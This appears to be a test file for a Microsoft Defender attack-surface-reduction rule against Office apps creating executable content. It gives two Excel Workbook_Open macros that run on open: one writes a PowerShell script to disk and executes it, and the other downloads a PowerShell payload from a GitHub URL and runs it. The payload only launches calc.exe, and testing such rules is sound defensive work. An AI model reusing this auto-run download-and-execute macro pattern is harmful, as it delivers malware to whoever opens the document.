.SYNOPSIS
	Triggers rule by downloading and executing a PowerShell script that launches calc.exe
	
	Two files:
		createExecutable.xlsm --> creates a powershell script locally
		createExecutable-onlineGet --> retrieves a powershell script from URL
	
.AUTHOR
	thomas@grome.dev

.ASR RULE
	Block Office applications from creating executable content
	This rule prevents Office apps, including Word, Excel, and PowerPoint, from creating potentially malicious executable content, by blocking malicious code from being written to disk.

	Malware that abuses Office as a vector might attempt to break out of Office and save malicious components to disk. These malicious components would survive a computer reboot and persist on the system. Therefore, this rule defends against a common persistence technique.

	Intune name: Office apps/macros creating executable content

	SCCM name: Block Office applications from creating executable content

	GUID: 3b576869-a4ec-4529-8536-b80a7769e899

	Advanced hunting action type:

	AsrExecutableOfficeContentAudited
	AsrExecutableOfficeContentBlocked
	Dependencies: Microsoft Defender Antivirus, RPC

.SOURCE CODE [createExecutable.xlsm]
Sub Workbook_Open()

    ' Creates dir to download payload to
    MkDir "C:\tempPayload"
    
    ' Defines data types as object
    Dim FSO As Object
    
    ' Sets object from above
    Set FSO = CreateObject("Scripting.FileSystemObject")
    
    ' Creates powershell script
    Set FileToCreate = FSO.CreateTextFile("C:\tempPayload\calcPayload.ps1")

    ' Writes content to powershell script
    FileToCreate.Write "Invoke-Item 'C:\Windows\System32\calc.exe'"
    FileToCreate.Close
       
    ' Defines datatypes in order to execute payload
    Dim wshShell        As Object
    Dim wshShellExec    As Object
    Dim strCommand      As String
    Dim strOutput
    
    ' Executes payload by running the script via a powershell shell
    strCommand = "Powershell.exe -File ""C:\tempPayload\calcPayload.ps1"""
    Set wshShell = CreateObject("WScript.Shell")
    Set wshShellExec = wshShell.Exec(strCommand)
    strOutput = wshShellExec.StdOut.ReadAll()


End Sub

	
.SOURCE CODE [createExecutable-onlineGet]
	Sub Workbook_Open()

		' Defines datatypes as a string or object
		Dim evalURL As String
		Dim streamObject As Object
		Dim winHttpRequest As Object
		
		' Creates dir to download payload to
		MkDir "C:\tempPayload"
		
		' Executes web request
		Set winHttpRequest = CreateObject("Microsoft.XMLHTTP")

		' Downloads payload used to execute calc.exe
		evalURL = "https://raw.githubusercontent.com/gromedev/public/main/dump/calcPayload.ps1"
		winHttpRequest.Open "GET", evalURL, False
		winHttpRequest.send

		'Saves payload to c:\tempPayload\calcPayload.ps1
		If winHttpRequest.Status = 200 Then
			Set streamObject = CreateObject("ADODB.Stream")
			streamObject.Open
			streamObject.Type = 1
			streamObject.Write winHttpRequest.responseBody
			streamObject.SaveToFile "C:\tempPayload\calcPayload.ps1", 2
			
			streamObject.Close
		   End If
		   
		' Defines datatypes in order to execute payload
		Dim wshShell        As Object
		Dim wshShellExec    As Object
		Dim strCommand      As String
		Dim strOutput
		
		' Executes payload by running the script via a powershell shell
		strCommand = "Powershell.exe -File ""C:\tempPayload\calcPayload.ps1"""     'Note: Payload is stored in Authors payload. You may save the script to another server and change the URL accordingly in order to prevent changes in the code.
		Set wshShell = CreateObject("WScript.Shell")
		Set wshShellExec = wshShell.Exec(strCommand)
		strOutput = wshShellExec.StdOut.ReadAll()
		Debug.Print "StdOut:", strOutput

		strOutput = wshShellExec.StdErr.ReadAll()
			

		' Remember to remove c:\payloadTemp directory
		RmDir "C:\tempPayload"

	End Sub
